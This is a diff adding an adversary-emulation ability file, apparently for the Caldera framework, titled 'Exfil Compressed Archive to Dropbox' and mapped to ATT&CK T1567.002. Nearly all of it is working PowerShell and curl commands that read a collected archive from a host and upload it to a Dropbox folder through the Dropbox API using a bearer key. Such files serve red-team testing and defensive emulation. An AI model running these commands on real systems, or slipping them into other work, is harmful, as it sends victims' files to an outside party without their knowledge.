@@ -1,0 +1,58 @@
+---
+
+- id: 3ce95a28-25fc-4a7e-a0cd-0fdb190e2081
+  name: Exfil Compressed Archive to Dropbox
+  description: This will exfiltrate an archive to Dropbox.
+  tactic: exfiltration
+  technique:
+    attack_id: T1567.002
+    name: Exfiltration to Cloud Storage
+  platforms:
+    windows:
+      psh:
+        command: |
+          $SourceFile = (Get-Item #{host.dir.compress});
+          $RemoteName = "$(Get-Date -Format yyyymmddhhmmss)-exfil-#{paw}-$($SourceFile.name)";
+          $TargetFilePath = "/#{dropbox.target.dir}/$RemoteName";
+          $ApiKey = "#{dropbox.api.key}";
+
+          $url = "https://content.dropboxapi.com/2/files/upload";
+
+          $file = [IO.File]::ReadAllBytes($SourceFile);
+          [net.httpWebRequest] $req = [net.webRequest]::create($url);
+
+          $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }';
+          $authorization = "Bearer " + $ApiKey;
+
+          $req.method = "POST";
+          $req.Headers.Add("Authorization", $authorization);
+          $req.Headers.Add("Dropbox-API-Arg", $arg);
+          $req.ContentType = 'application/octet-stream';
+          $req.ContentLength = $file.length;
+          $req.TimeOut = 50000;
+          $req.KeepAlive = $true;
+          $req.Headers.Add("Keep-Alive: 300");
+          $reqst = $req.getRequestStream();
+          $reqst.write($file, 0, $file.length);
+          $reqst.flush();
+          $reqst.close();
+
+          [net.httpWebResponse] $res = $req.getResponse();
+          $resst = $res.getResponseStream();
+          $sr = new-object IO.StreamReader($resst);
+          $result = $sr.ReadToEnd();
+          $result;
+          $res.close();
+    linux:
+      sh:
+        command: |
+          LocalFile='#{host.dir.compress}';
+          RemoteName="$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename $LocalFile)";
+          curl -X POST https://content.dropboxapi.com/2/files/upload
+              --header "Authorization: Bearer #{dropbox.api.key}"
+              --header "Dropbox-API-Arg: {\"path\": \"/#{dropbox.target.dir}/$RemoteName\",\"mode\": \"add\",\"autorename\": true,\"mute\": false,\"strict_conflict\": false}"
+              --header "Content-Type: application/octet-stream"
+              --data-binary @#{host.dir.compress}
+  requirements:
+    - plugins.stockpile.app.requirements.paw_provenance:
+        - source: host.dir.compress
